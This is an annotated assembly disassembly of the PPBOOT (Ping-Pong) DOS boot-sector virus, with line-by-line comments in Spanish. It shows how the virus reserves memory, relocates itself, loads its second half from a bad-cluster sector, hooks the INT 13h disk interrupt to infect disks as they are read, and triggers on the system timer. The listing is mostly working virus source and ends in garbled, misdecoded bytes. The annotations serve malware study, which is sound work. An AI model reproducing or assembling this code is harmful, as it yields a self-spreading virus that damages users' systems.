


PAGE  60,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             PPBOOT                                   ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   15-Mar-90                                            ÛÛ
;ÛÛ      Code type: zero start                                           ÛÛ
;ÛÛ      Passes:    5          Analysis Flags on: H                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e         equ     7C0Dh                   ; (8F68:7C0D=0)
data_2e         equ     7C0Eh                   ; (8F68:7C0E=0)
data_3e         equ     7C13h                   ; (8F68:7C13=0)
data_4e         equ     7C18h                   ; (8F68:7C18=0)
data_5e         equ     7C1Ah                   ; (8F68:7C1A=0)
data_6e         equ     7C1Ch                   ; (8F68:7C1C=0)
data_7e         equ     7DF3h                   ; (8F68:7DF3=0)
data_8e         equ     7DF5h                   ; (8F68:7DF5=0)
data_9e         equ     7DF7h                   ; (8F68:7DF7=0)
data_10e        equ     7DF8h                   ; (8F68:7DF8=0)
data_11e        equ     7EB2h                   ; (8F68:7EB2=0)
data_12e        equ     800Bh                   ; (8F68:800B=0)
data_13e        equ     800Dh                   ; (8F68:800D=0)
data_14e        equ     800Eh                   ; (8F68:800E=0)
data_15e        equ     8010h                   ; (8F68:8010=0)
data_16e        equ     8011h                   ; (8F68:8011=0)
data_17e        equ     8016h                   ; (8F68:8016=0)
data_18e        equ     81F5h                   ; (8F68:81F5=0)
data_19e        equ     81F9h                   ; (8F68:81F9=0)
data_20e        equ     81FBh                   ; (8F68:81FB=0)
data_21e        equ     81FCh                   ; (8F68:81FC=0)

seg_a           segment
                assume  cs:seg_a, ds:seg_a


                org     0

ppboot          proc    far

start:
;*              jmp     short loc_2             ;*(001E)
                db      0EBh, 1Ch
                db      90h
                db      'IBM  3.2'
                db      0, 2, 2, 1, 0, 2
                db      70h, 0, 0D0h, 2, 0FDh, 2
                db      0, 9, 0, 2, 0, 0
                db      0
loc_2:
                xor     ax,ax                   ; Zero register
                mov     ss,ax    ; ss = 0
                mov     sp,7C00h ; 0:7C00h es donde se carga el boot sector
                mov     ds,ax    ; ds = 0
                mov     ax,word ptr ds:[413h]
                ; (0000:0413=280h) ; Memoria = 640k

                sub     ax,2
                ; baja la memoria total disponible para el sistema en 2k

                mov     word ptr ds:[413h],ax   ; (0000:0413=280h)
                ; Memoria = 638k

                mov     cl,6
                shl     ax,cl
                ; (Shift w/zeros fill) multiplica memoria disp. en k por 64
                ; convierte a memoria disp. en paragraph

                sub     ax,7C0h
                ; le resta 7C0h = poco menos de 2k -> ¨Lugar para copiarse?

                mov     es,ax  ; apunta es al lugar elegido
                mov     si,7C00h
                ; inicio del boot record en memoria

                mov     di,si
                mov     cx,100h
                ; mueve 100h words. Se supone que hacia adelante
                ; Se autocopia lo m s adelante que puede.

                rep     movsw      ; Rep while cx>0 Mov [si] to es:[di]

                db      8Eh, 0C8h
              ; mov cs, ax ; OPERACION PROHIBIDA!!!
                                   ; te¢ricamente tendr¡a que saltar a ax:ip
                                   ; -> inicio lugar de copiado + ip (ip = 45)
                                   ; lo que hace es saltar de segmento,
                                   ; pero no de offset.


;ßßßßßßßßßßßßßßßß ­Ojo, desde ac  est  en otro segmento! ßßßßßßßßßßßßßßßßßß


                push    cs         
                pop     ds         ; pone en ds a cs
                                   ; -> renueva ds al nuevo segmento

                call    sub_1      ; (004A)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ


sub_1           proc    near
                xor     ah,ah      ; Zero register
                int     13h        ; Disk  dl=drive a: ah=func 00h
                                   ;  reset disk, al=return status

                and     byte ptr ds:[7DF8h],80h ; (7D92:7DF8=0)
                                                ; offset 1F8h del boot = 0h
                                                ; nro. drive que est  el virus

                mov     bx,word ptr ds:[7DF9h]  ; (7D92:7DF9=0)
                                                ; offset 1F9 del boot = 02AAh
                                                ; direcci¢n del
                                                ; cluster malo; o sea, donde
                                                ; est  su segunda parte

                push    cs
                pop     ax                      ; ax = cs
                sub     ax,20h                  ; ax = cs - 20h
                mov     es,ax                   ; es = cs - 20h

                call    sub_2         ; (009D)
                                      ; lee sector de disco a es:8000h
                                      ; lo que lee es la segunda parte
                                      ; del virus. Si no puede leerla por
                                      ; un error de disco, sigue tratando
                                      ; siempre, hasta que puede.
                                      ; lo lee a cs:7E00 -> offset 200h
                                      ; es a continuaci¢n directa
                                      ; de la primera parte del virus

                mov     bx,word ptr ds:[7DF9h]  ; (7D92:7DF9=0)
                inc     bx                      ; bx = spv + 1
                                                ; segunda parte del cluster
                                                ; malo, boot original.

                mov     ax,0FFC0h
                mov     es,ax

                call    sub_2                   ; (009D)
                                                ; lee segunda parte del
                                                ; cluster malo (boot original)
                                                ; a FFC0:8000h -> 7C00:0000
                                                ; lo lee a su posici¢n correcta

                xor     ax,ax                   ; Zero register
                mov     byte ptr ds:[7DF7h],al  ; (7D92:7DF7=0)
                                                ; pone 0 en offset 1F7
                mov     ds,ax                   ; ds = 0

                mov     ax,word ptr ds:[4Ch]    ; (0000:004C=213h)
                mov     bx,word ptr ds:[4Eh]    ; (0000:004E=0E86h)

                                                ; toma int 13h

                mov     word ptr ds:[4Ch],7CD0h ; (0000:004C=213h)
                mov     word ptr ds:[4Eh],cs    ; (0000:004E=0E86h)

                                                ; pone en tabla de
                                                ; interrupts, int 13h cs:7CD0
                                                ; -> offset D0 en boot
                                                ; int_13h_drv

                push    cs
                pop     ds     ; ds = cs

                mov     word ptr ds:[7D2Ah],ax  ; (7D92:7D2A=0)
                mov     word ptr ds:[7D2Ch],bx  ; (7D92:7D2C=0)

                ; pone old_int_13h en offset 12Ah del boot

                mov     dl,byte ptr ds:[7DF8h]  ; (7D92:7DF8=0)

                                                ; poner en DL nro.
                                                ; de drive del virus
                                                ; el SO espera en DL el
                                                ; nro. del drive de donde
                                                ; cargar el SO. Con esto lo
                                                ; carga del mismo drive
                                                ; que el virus

;*              jmp     far ptr loc_1           ;*(0000:7C00)
                db      0EAh, 0, 7Ch, 0, 0 ; jmp 0000:7C00

                ; salta al inicio del boot normal, carga SO,
                ; y operaci¢n normal

sub_1           endp

                mov     ax,301h
                jmp     short loc_2             ; (00A0)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;         SUBROUTINE
;              par metros = bx: sector que se va a cargar,
;                           es: sector en el que se va a cargar (es:8000h)
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2           proc    near
                mov     ax,201h
loc_2:
                xchg    ax,bx            ; en bx hab¡a word ptr ds:[7DF9h]
                                         ; o sea, direccion
                                         ; primer sector cluster malo (psv)

                add     ax,word ptr ds:[7C1Ch]  ; (7D92:7C1C=0) offset 1C
                                                ; dentro del boot ->
                                                ; nro. de sectores ocultos (so)
                                                ; ax = psv + so

                xor     dx,dx                   ; Zero register
                div     word ptr ds:[7C18h]     ; (7D92:7C18=0) offset 18
                                                ; dentro del boot ->
                                                ; sectores por pista (spp)
                                                ; dx = 0

                                                ; ax,dxrem=dx:ax/data
                                                ; ax = dx:ax div ds:7C18
                                                ; dx = dx:ax mod ds:7C18
                                                ; ax = so + psv / spp
                                                ; dx = so + psv mod spp

                inc     dl                      ; resto + 1
                mov     ch,dl                   ; guardo en ch

                xor     dx,dx                   ; Zero register
                div     word ptr ds:[7C1Ah]     ; (7D92:7C1A=0) offset 1A
                                                ; dentro del boot ->
                                                ; n£mero de cabezas (ndc)
                                ; dx = 0
                                ; ax = so + [ds:7DF9] / spp

                                ; ax,dxrem=dx:ax/data
                                ; ax = dx:ax div ds:7C1A
                                ; dx = dx:ax mod ds:7C1A
                                ; ax = (so + [ds:7DF9] / spp) / ndc
                                ; dx = (so + [ds:7DF9] / spp) mod ndc

                mov     cl,6    ;
                shl     ah,cl   ; Shift w/zeros fill [ah = ah * 40h]
                or      ah,ch
                mov     cx,ax
                xchg    ch,cl
                mov     dh,dl
                mov     ax,bx   ; en bx hab¡a 0201h

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_3:
                mov     dl,byte ptr ds:[7DF8h]  ; (7D92:7DF8=0)
                mov     bx,8000h
                int     13h        ; Disk  dl=drive a: ah=func 02h
                                   ;  read sectors to memory es:bx
                                   ; leer un sector [al = 01h]
                                   ; ch = cilindro
                                   ; cl = sector
                                   ; dh = cabeza
                                   ; dl = drive

                jnc     loc_ret_3   ; Jump if carry=0
                                    ; si no hay error, vuelve de la subrutina

                pop     ax     ; si hay error, vuelve a sub_1
                               ; saca del stack la direcci¢n de sub_2
                               ; y queda en el tope la direcci¢n de sub_1

loc_ret_3:
                retn        ; return near


sub_2           endp


;±±±±±±±±±±±±±±±± Driver de interrupt 13h ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

; int_13h_drv proc far

                push    ds  ; ³
                push    es  ; ³
                push    ax  ; ³
                push    bx  ; ³
                push    cx  ; ³
                push    dx  ; ÀÄÄ salva regs

                push    cs
                pop     ds
                push    cs
                pop     es  ; ds y es = cs

                test    byte ptr ds:[7DF7h],1   ; (7D92:7DF7=0)
                                                ; testea si hay un 1 en el
                                                ; bit menos significativo del
                                                ; offset 1F7 dentro del boot

                jnz     loc_6                   ; Jump if not zero -> salir

                cmp     ah,2                    ; ¨es una lectura?
                jne     loc_6                   ; Jump if not equal
                                                ; -> si no, salir

                cmp     byte ptr ds:[7DF8h],dl  ; (7D92:7DF8=0)
                                                ; offset 1F8 -> drive que
                                                ; se us¢ antes
                                                ; dl = drive que se quiere leer
                                                ; ¨quiere leer del drive
                                                ; anterior? (*)

                mov     byte ptr ds:[7DF8h],dl  ; (7D92:7DF8=0)
                                                ; pone dl, el drive que
                                                ; se quiere leer, en offset 1F8

                jnz     loc_5                   ; Jump if not zero
                                                ; si no(*), se va a loc_5

                xor     ah,ah                   ; Zero register
                int     1Ah                     ; Real time clock
                                                ; ah=func 00h
                                                ; get system timer count cx:dx

                                                ; en dx est  la parte baja
                test    dh,7Fh                  ; del counter del reloj
                jnz     loc_4                   ; Jump if not zero

                test    dl,0F0h
                jnz     loc_4                   ; Jump if not zero

                push    dx                      ; salva dx

;*              call    sub_5                   ;*(02B3) est  en otra parte
                db      0E8h, 0B1h, 1           ; del virus, en el offset 02B3
                                                ; -> en 7EB3

                pop     dx                      ; restaura dx
loc_4:
                mov     cx,dx
                sub     dx,word ptr ds:[7EB0h]  ; (7D92:7EB0=0) offset 2B0h
                mov     word ptr ds:[7EB0h],cx  ; (7D92:7EB0=0)
                sub     dx,24h
                jc      loc_6                   ; Jump if carry Set
loc_5:
                or      byte ptr ds:[7DF7h],1   ; (7D92:7DF7=0)
                                                ; pone 1 en el bit
                                                ; menos significativo del
                                                ; offset 1F7

                push    si   ;³
                push    di   ;ÀÄ salva si y di

                call    sub_4                   ; (012E)

                pop     di   ;³
                pop     si   ;ÀÄ restaura si y di

                and     byte ptr ds:[7DF7h],0FEh  ; (7D92:7DF7=0)
                                                  ; pone 0 en el bit
                                                  ; menos significativo del
                                                  ; offset 1F7

loc_6:
                pop     dx  ; ³
                pop     cx  ; ³
                pop     bx  ; ³
                pop     ax  ; ³
                pop     es  ; ³
                pop     ds  ; ÀÄÄ restaura regs

;*              jmp     far ptr loc_15          ;*(F000:EC59)
                db      0EAh, 59h, 0ECh, 0, 0F0h

; int_13h_drv endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_4           proc    near
                mov     ax,201h
                mov     dh,0
                mov     cx,1
                call    sub_3                   ; (00C3)
                test    byte ptr ds:[7DF8h],80h ; (7D92:7DF8=0)
                jz      loc_9                   ; Jump if zero
                mov     si,81BEh
                mov     cx,4

locloop_7:
                cmp     byte ptr [si+4],1
                je      loc_8                   ; Jump if equal
                cmp     byte ptr [si+4],4
                je      loc_8                   ; Jump if equal
                add     si,10h
                loop    locloop_7               ; Loop if cx > 0

                retn
loc_8:
                mov     dx,[si]
                mov     cx,[si+2]
                mov     ax,201h
                call    sub_3                   ; (00C3)
loc_9:
                mov     si,8002h
                mov     di,7C02h
                mov     cx,1Ch
                rep     movsb                   ; Rep while cx>0 Mov [si] to es:[di]
                cmp     word ptr ds:[81FCh],1357h       ; (7D92:81FC=0)
                jne     loc_11                  ; Jump if not equal
                cmp     byte ptr ds:[81FBh],0   ; (7D92:81FB=0)
                jae     loc_ret_10              ; Jump if above or =
                mov     ax,word ptr ds:[81F5h]  ; (7D92:81F5=0)
                mov     word ptr ds:[7DF5h],ax  ; (7D92:7DF5=0)
                mov     si,word ptr ds:[81F9h]  ; (7D92:81F9=0)
;*              jmp     loc_14                  ;*(0292)
                db      0E9h, 8, 1

loc_ret_10:
                retn
loc_11:
                cmp     word ptr ds:[800Bh],200h        ; (7D92:800B=0)
                jne     loc_ret_10              ; Jump if not equal
                cmp     byte ptr ds:[800Dh],2   ; (7D92:800D=0)
                jb      loc_ret_10              ; Jump if below
                mov     cx,word ptr ds:[800Eh]  ; (7D92:800E=0)
                mov     al,byte ptr ds:[8010h]  ; (7D92:8010=0)
                cbw                             ; Convrt byte to word
                mul     word ptr ds:[8016h]     ; (7D92:8016=0) ax = data * ax
                add     cx,ax
                mov     ax,20h
                mul     word ptr ds:[8011h]     ; (7D92:8011=0) ax = data * ax
                add     ax,1FFh
                mov     bx,200h
                div     bx                      ; ax,dx rem=dx:ax/reg
                add     cx,ax
                mov     word ptr ds:[7DF5h],cx  ; (7D92:7DF5=0)
                mov     ax,word ptr ds:[7C13h]  ; (7D92:7C13=0)
                sub     ax,word ptr ds:[7DF5h]  ; (7D92:7DF5=0)
                mov     bl,byte ptr ds:[7C0Dh]  ; (7D92:7C0D=0)
                xor     dx,dx                   ; Zero register
                xor     bh,bh                   ; Zero register
                div     bx                      ; ax,dx rem=dx:ax/reg
                inc     ax
                mov     di,ax
                and     byte ptr ds:[7DF7h],0FBh        ; (7D92:7DF7=0)
                cmp     ax,0FF0h
                jbe     loc_12                  ; Jump if below or =
                or      byte ptr ds:[7DF7h],4   ; (7D92:7DF7=0)
loc_12:
                mov     si,1
                mov     bx,word ptr ds:[7C0Eh]  ; (7D92:7C0E=0)
                dec     bx
                mov     word ptr ds:[7DF3h],bx  ; (7D92:7DF3=0)
                mov     byte ptr ds:[7EB2h],0FEh        ; (7D92:7EB2=0)
;*              jmp     short loc_13            ;*(0200)
sub_4           endp

                db      0EBh, 0Dh
                add     [bx+si],ax
                or      al,0
                add     [bx+si],ax
                stosb                           ; Store al to es:[di]
                add     al,[bx+si]
                push    di
                adc     dx,[di-56h]


